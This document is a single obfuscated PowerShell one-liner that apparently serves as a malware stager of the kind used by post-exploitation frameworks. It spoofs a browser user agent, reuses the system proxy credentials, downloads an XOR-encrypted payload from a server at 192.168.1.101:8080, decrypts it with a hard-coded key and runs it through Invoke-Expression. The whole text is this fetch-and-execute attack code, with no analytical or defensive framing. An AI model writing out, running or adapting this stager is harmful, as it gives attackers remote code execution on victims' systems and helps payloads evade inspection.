
[SYSteM.NeT.SErvicEPoiNTMANageR]::ExpEct100CONTInUe = 0;$WC=NeW-OBJect SYsTEM.NET.WeBClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDeRs.ADd('User-Agent',$u);$WC.PRoXy = [SySTem.NeT.WebREqUeST]::DeFAUltWEBPRoXY;$wc.PROxy.CreDEntiAls = [SYSTem.NEt.CredENtIaLCaCHe]::DEfauLTNETWorKCreDENtIaLS;$K='SZ9z1*o6&jc{AE(N3)RXih78e!u:wq}B';$i=0;[ChAr[]]$b=([Char[]]($wc.DowNloAdSTRIng("http://192.168.1.101:8080/index.asp")))|%{$_-bXOr$k[$I++%$K.LENGth]};IEX ($B-jOIN'')

